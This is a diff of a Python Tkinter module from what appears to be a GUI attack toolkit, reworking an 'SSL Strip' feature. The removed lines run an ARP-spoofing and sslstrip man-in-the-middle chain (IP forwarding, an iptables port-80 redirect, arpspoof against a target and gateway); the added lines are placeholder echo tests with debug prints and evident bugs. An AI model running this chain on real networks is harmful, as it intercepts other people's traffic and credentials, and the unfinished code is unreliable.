@@ -1,87 +1,87 @@
-import warnings
-from cryptography.utils import CryptographyDeprecationWarning
-warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
-from Layer2Attacks.PageArpAttacks.funcFrameArp import *
-
-import scapy.all as scapy
-import time
 import threading
 import traceback
 import subprocess
+import time
+import signal
 
 from tkinter import *
 
-def startSsl(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp) :
-    testLink()
+def startSslStrip(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
+    global sslStripIsRunning, sslStripThreads, terminalLabel, wiresharkLabel, errorOutputLabel
 
-    global sslThreads, sslIsRunning, terminalLabel, wiresharkLabel, errorOutputLabel
-
-    sslIsRunning = False
-    sslThreads = threading.Thread(target = lambda : stripSsl())
+    sslStripIsRunning = False
+    sslStripThreads = threading.Thread(target = lambda : sslStripHub())
 
     terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
+    terminalLabel.configure(bg = colorConfig) 
+    wiresharkLabel.configure(bg = colorConfig)
+    errorOutputLabel.configure(bg = colorConfig)
 
-    terminalLabel['text'] += "$ echo 1 > /proc/sys/net/ipv4/ip_forward \n"
-    terminalProcess = subprocess.Popen(["echo", "l", ">", "/proc/sys/net/ipv4/ip_forward"],
-                                       stdout=subprocess.PIPE, universal_newlines=TRUE)
-    terminalLabel['text'] += terminalProcess.communicate()[0]
+    terminalLabel["text"] += "$ Running SSL Strip Attack...\n\n"
 
-    terminalLabel['text'] += "$ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 \n"
-    terminalProcess = subprocess.Popen(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "8080"],
-                                       stdout=subprocess.PIPE, universal_newlines=TRUE)
-    terminalLabel['text'] += terminalProcess.communicate()[0]
+    runSslStrip()
 
-    # terminalLabel['text'] += "$ arpspoof -i eth0 -t" + targetIp + "-r" + defaultGatewayIp + "\n"
-    # terminalProcess = subprocess.Popen(["arpspoof", "-i", "eth0", "-t", targetIp, "-r", defaultGatewayIp],
-    #                                    stdout=subprocess.PIPE, universal_newlines=TRUE)
-    # terminalLabel['text'] += terminalProcess.communicate()[0]
+    terminalLabel.pack(anchor = NW)
+    errorOutputLabel.pack(anchor = NW)
 
-    startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp, "#1A3329")
-    #runArpAttack(targetIp, defaultGatewayIp)
-    print("Test 1")
-    runSslStripAttack()
-    print("Test 2")
+def stopSslStrip() :
+    global sslStripThreads, sslStripIsRunning
 
-def stopSsl(targetIp, defaultGatewayIp) :
-    global sslThreads, sslIsRunning, terminalLabel, errorOutputLabel
+    try:
+        terminalLabel["text"] += "\n$ Stopping SSL Strip Attack...\n\n"
+        sslStripIsrunning = False
+        sslStripThreads.join(0)
+        sslStripThreads = None
 
-    try :
-        terminalLabel["text"] += "$ Stopping SSL Strip Attack..."
-        print("Test 6")
-        sslIsRunning = False
-        sslThreads.join(0)
-        sslThreads = None
+        process.send_signal(signal.SIGINT)
+        process.wait()
+        runTerminal1Thread.join(timeout=0.05)
+        #runTerminal2Thread.join(timeout=0.05)
 
-        stopArp(targetIp, defaultGatewayIp)
-
-        terminalLabel["text"] += "$ SSL Strip Attack successfully stopped!"
+        terminalLabel["text"] += "$ SSL Strip Attack successfully stopped!\n"
+    except (AttributeError, RuntimeError):
+        errorOutputLabel["text"] += traceback.format_exc()
     except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"
 
-def runArpSpoofAttack(targetIp, defaultGatewayIp) :
-    terminalLabel['text'] += "$ arpspoof -i eth0 -t" + targetIp + "-r" + defaultGatewayIp + "\n"
-    terminalProcess = subprocess.Popen(["arpspoof", "-i", "eth0", "-t", targetIp, "-r", defaultGatewayIp],
-                                       stdout=subprocess.PIPE, universal_newlines=TRUE)
-    terminalLabel['text'] += terminalProcess.communicate()[0]
+def runSslStrip() :
+    global sslStripThreads, sslStripIsRunning
+    sslStripIsRunning = True
+    sslStripThreads.start()
 
-def runSslStripAttack() :
-    global sslThreads, sslIsRunning
-    print("Test 3")
-    sslIsRunning = True
-    sslThreads.start()
-
-def stripSsl() :
-    global terminalLabel, errorOutputLabel, sslIsRunning, terminalProcess
-    print("Test 4")
-    print(str(sslIsRunning) + " ||| ?")
-    try :
-        terminalLabel["text"] += "$ Running SSL Strip Attack..."
-        terminalLabel['text'] += "$ sslstrip -l 8080 \n"
-        print("Test 5")
-        terminalProcess = subprocess.Popen(["sslstrip", "-l", "8080"], stdout=subprocess.PIPE, universal_newlines=TRUE)
-        print("Test 7")
+def sslStripHub():
+    global process, runTerminal1Thread
+    #process = subprocess.Popen(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    #process.stdin.write(f"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080".encode())
+    process = subprocess.Popen(["echo", "kali"], stdin = subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
-    except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
+    runTerminal1Thread = threading.Thread(target=reader, args=(process,))
+    runTerminal1Thread.start()
+
+    commands = ["echo linux"]
+
+    for command in commands:
+        print("CHECK 1")
+        terminalLabel["text"] += f"Executing command : {command}"
+        process.stdin.write(f"{command}\n".encode())
+        #process.stdin.flush()
+        print("CHECK 2")
+        # Give it some time to process the command and generate output
+        time.sleep(2)
+        print("CHECK 3")
+
+    # process.stdin.write(f"echo linux".encode())
+
+    # SOLVE HOW TO RUN MULTIPLE POPEN AND STILL BE ABLE TO CALL SIGINT
+
+def reader(proc):
+    print(output + " 1")
+    while True:
+        output = proc.stdout.readline().decode()
+        print(output + " 2")
+        if output == '' and proc.poll() is not None:
+            break
+        if output:
+            print(output.strip())
